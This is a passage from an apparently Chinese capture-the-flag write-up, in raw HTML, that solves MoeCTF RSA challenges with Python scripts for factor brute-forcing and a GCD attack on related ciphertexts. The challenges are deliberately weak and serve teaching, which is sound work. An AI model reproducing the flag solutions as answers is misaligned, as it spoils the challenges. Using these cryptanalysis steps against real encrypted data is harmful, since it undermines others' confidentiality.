cjk_fallback">的</span><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">因</span><span class="mord cjk_fallback">子</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">再</span><span class="mord cjk_fallback">遍</span><span class="mord cjk_fallback">历</span><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">能</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">8</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">6</span><span class="mord">2</span><span class="mord">1</span><span class="mord">4</span><span class="mord">4</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">还</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">算</span><span class="mord cjk_fallback">大</span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line">k = <span class="number">0x2227e398fc6ffcf5159863a345df85ba50d6845f8c06747769fee78f598e7cb1bcf875fb9e5a69ddd39da950f21cb49581c3487c29b7c61da0f584c32ea21ce1edda7f09a6e4c3ae3b4c8c12002bb2dfd0951037d3773a216e209900e51c7d78a0066aa9a387b068acbd4fb3168e915f306ba40</span></span><br><span class="line">key = gmpy2.iroot(<span class="number">4</span>*k, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">l = [<span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">31</span>, <span class="number">61</span>, <span class="number">223</span>, <span class="number">4013</span>, <span class="number">281317</span>, <span class="number">4151351</span>, <span class="number">339386329</span>, <span class="number">370523737</span>, <span class="number">5404604441993</span>,</span><br><span class="line">     <span class="number">26798471753993</span>, <span class="number">25866088332911027256931479223</span>, <span class="number">64889106213996537255229963986303510188999911</span>]</span><br><span class="line">seq = [<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, seq)) <span class="keyword">for</span> seq <span class="keyword">in</span> product(<span class="string">&#x27;01&#x27;</span>, repeat=<span class="number">18</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> seq[<span class="number">1</span>:]:</span><br><span class="line">    flag = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">        <span class="keyword">if</span> i[j] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            flag *= l[j]</span><br><span class="line">    f = long_to_bytes(flag-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;moectf&#123;&#x27;</span> <span class="keyword">in</span> f:</span><br><span class="line">        <span class="built_in">print</span>(f.decode()+long_to_bytes(key//(flag-<span class="number">1</span>)+<span class="number">1</span>).decode())</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="大白兔"><a class="markdownIt-Anchor" href="#大白兔"></a> 大白兔</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;moectf&#123;xxxxxxxxxx&#125;&#x27;</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">e1 = <span class="number">12886657667389660800780796462970504910193928992888518978200029826975978624718627799215564700096007849924866627154987365059524315097631111242449314835868137</span></span><br><span class="line">e2 = <span class="number">12110586673991788415780355139635579057920926864887110308343229256046868242179445444897790171351302575188607117081580121488253540215781625598048021161675697</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m , e1 , e2</span>):</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = getPrime(<span class="number">512</span>)</span><br><span class="line">    N = p*q</span><br><span class="line">    c1 = <span class="built_in">pow</span>((<span class="number">3</span>*p + <span class="number">7</span>*q),e1,N)</span><br><span class="line">    c2 = <span class="built_in">pow</span>((<span class="number">2</span>*p + <span class="number">5</span>*q),e2,N)</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    c = <span class="built_in">pow</span>(m , e , N)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(encrypt(m ,e1 , e2))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">N = 107840121617107284699019090755767399009554361670188656102287857367092313896799727185137951450003247965287300048132826912467422962758914809476564079425779097585271563973653308788065070590668934509937791637166407147571226702362485442679293305752947015356987589781998813882776841558543311396327103000285832158267</span></span><br><span class="line"><span class="string">c1 = 15278844009298149463236710060119404122281203585460351155794211733716186259289419248721909282013233358914974167205731639272302971369075321450669419689268407608888816060862821686659088366316321953682936422067632021137937376646898475874811704685412676289281874194427175778134400538795937306359483779509843470045</span></span><br><span class="line"><span class="string">c2 = 21094604591001258468822028459854756976693597859353651781642590543104398882448014423389799438692388258400734914492082531343013931478752601777032815369293749155925484130072691903725072096643826915317436719353858305966176758359761523170683475946913692317028587403027415142211886317152812178943344234591487108474</span></span><br><span class="line"><span class="string">c = 21770231043448943684137443679409353766384859347908158264676803189707943062309013723698099073818477179441395009450511276043831958306355425252049047563947202180509717848175083113955255931885159933086221453965914552773593606054520151827862155643433544585058451821992566091775233163599161774796561236063625305050</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>跳过</mtext><mi mathvariant="normal">%</mi><mi>N</mi><mtext>到</mtext><mi mathvariant="normal">%</mi><mi>q</mi><mtext>这个步骤，因为二者是等价的</mtext></mrow><annotation encoding="application/x-tex">跳过\%N到\%q这个步骤，因为二者是等价的</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.94444em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">跳</span><span class="mord cjk_fallback">过</span><span class="mord">%</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord cjk_fallback">到</span><span class="mord">%</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">步</span><span class="mord cjk_fallback">骤</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">因</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">二</span><span class="mord cjk_fallback">者</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">等</span><span class="mord cjk_fallback">价</span><span class="mord cjk_fallback">的</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mrow><msub><mi>e</mi><mn>1</mn></msub><msub><mi>e</mi><mn>2</mn></msub></mrow></msup><mo>∗</mo><msubsup><mi>c</mi><mn>1</mn><msub><mi>e</mi><mn>2</mn></msub></msubsup><mo>≡</mo><mo stretchy="false">(</mo><mn>6</mn><mi>p</mi><mo>+</mo><mn>14</mn><mi>q</mi><msup><mo stretchy="false">)</mo><mrow><msub><mi>e</mi><mn>1</mn></msub><msub><mi>e</mi><mn>2</mn></msub></mrow></msup><mi mathvariant="normal">%</mi><mi>q</mi></mrow><annotation encoding="application/x-tex">2^{e_{1}e_{2}}*c_{1}^{e_{2}}\equiv (6p+14q)^{e_{1}e_{2}}\%q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0126em;vertical-align:-0.266308em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.746292em;"><span style="top:-2.433692em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span style="top:-3.1449000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.266308em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">6</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">4</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mord">%</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>3</mn><mrow><msub><mi>e</mi><mn>1</mn></msub><msub><mi>e</mi><mn>2</mn></msub></mrow></msup><mo>∗</mo><msubsup><mi>c</mi><mn>2</mn><msub><mi>e</mi><mn>1</mn></msub></msubsup><mo>≡</mo><mo stretchy="false">(</mo><mn>6</mn><mi>p</mi><mo>+</mo><mn>15</mn><mi>q</mi><msup><mo stretchy="false">)</mo><mrow><msub><mi>e</mi><mn>1</mn></msub><msub><mi>e</mi><mn>2</mn></msub></mrow></msup><mi mathvariant="normal">%</mi><mi>q</mi></mrow><annotation encoding="application/x-tex">3^{e_{1}e_{2}}*c_{2}^{e_{1}}\equiv (6p+15q)^{e_{1}e_{2}}\%q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord">3</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0126em;vertical-align:-0.266308em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.746292em;"><span style="top:-2.433692em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.1449000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.266308em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">6</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">5</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mord">%</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mrow><msub><mi>e</mi><mn>1</mn></msub><msub><mi>e</mi><mn>2</mn></msub></mrow></msup><mo>∗</mo><msubsup><mi>c</mi><mn>1</mn><msub><mi>e</mi><mn>2</mn></msub></msubsup><mo>−</mo><msup><mn>3</mn><mrow><msub><mi>e</mi><mn>1</mn></msub><msub><mi>e</mi><mn>2</mn></msub></mrow></msup><mo>∗</mo><msubsup><mi>c</mi><mn>2</mn><msub><mi>e</mi><mn>1</mn></msub></msubsup><mo>≡</mo><mn>0</mn><mi mathvariant="normal">%</mi><mi>q</mi></mrow><annotation encoding="application/x-tex">2^{e_{1}e_{2}}*c_{1}^{e_{2}}-3^{e_{1}e_{2}}*c_{2}^{e_{1}}\equiv 0\%q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0126em;vertical-align:-0.266308em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.746292em;"><span style="top:-2.433692em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span style="top:-3.1449000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.266308em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord">3</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0126em;vertical-align:-0.266308em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.746292em;"><span style="top:-2.433692em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.1449000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.266308em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.94444em;vertical-align:-0.19444em;"></span><span class="mord">0</span><span class="mord">%</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a = <span class="built_in">pow</span>(<span class="number">2</span>, e1*e2, N) * <span class="built_in">pow</span>(c1, e2, N)</span><br><span class="line">b = <span class="built_in">pow</span>(<span class="number">3</span>, e1*e2, N) * <span class="built_in">pow</span>(c2, e1, N)</span><br><span class="line">q = GCD(N, a-b)</span><br><span class="line">d = inverse(e, q-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, q)).decode())</span><br></pre></td></tr></table></figure><h2 id="more_secure_rsa"><a class="markdownIt-Anchor" href="#more_secure_rsa"></a> More_secure_RSA</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;moectf&#123;xxxxxxxxxxxxxxxxx&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q </span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Oh,it isn&#x27;t secure enough!</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">r = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = n * r</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;C = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;N = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c = 12992001402636687796268040906463852467529970619872166160007439409443075922491126428847990768804065656732371491774347799153093983118784555645908829567829548859716413703103209412482479508343241998746249393768508777622820076455330613128741381912099938105655018512573026861940845244466234378454245880629342180767100764598827416092526417994583641312226881576127632370028945947135323079587274787414572359073029332698851987672702157745794918609888672070493920551556186777642058518490585668611348975669471428437362746100320309846155934102756433753034162932191229328675448044938003423750406476228868496511462133634606503693079</span></span><br><span class="line"><span class="string">n = 16760451201391024696418913179234861888113832949815649025201341186309388740780898642590379902259593220641452627925947802309781199156988046583854929589247527084026680464342103254634748964055033978328252761138909542146887482496813497896976832003216423447393810177016885992747522928136591835072195940398326424124029565251687167288485208146954678847038593953469848332815562187712001459140478020493313651426887636649268670397448218362549694265319848881027371779537447178555467759075683890711378208297971106626715743420508210599451447691532788685271412002723151323393995544873109062325826624960729007816102008198301645376867</span></span><br><span class="line"><span class="string">C = 1227033973455439811038965425016278272592822512256148222404772464092642222302372689559402052996223110030680007093325025949747279355588869610656002059632685923872583886766517117583919384724629204452792737574445503481745695471566288752636639781636328540996436873887919128841538555313423836184797745537334236330889208413647074397092468650216303253820651869085588312638684722811238160039030594617522353067149762052873350299600889103069287265886917090425220904041840138118263873905802974197870859876987498993203027783705816687972808545961406313020500064095748870911561417904189058228917692021384088878397661756664374001122513267695267328164638124063984860445614300596622724681078873949436838102653185753255893379061574117715898417467680511056057317389854185497208849779847977169612242457941087161796645858881075586042016211743804958051233958262543770583176092221108309442538853893897999632683991081144231262128099816782478630830512</span></span><br><span class="line"><span class="string">N = 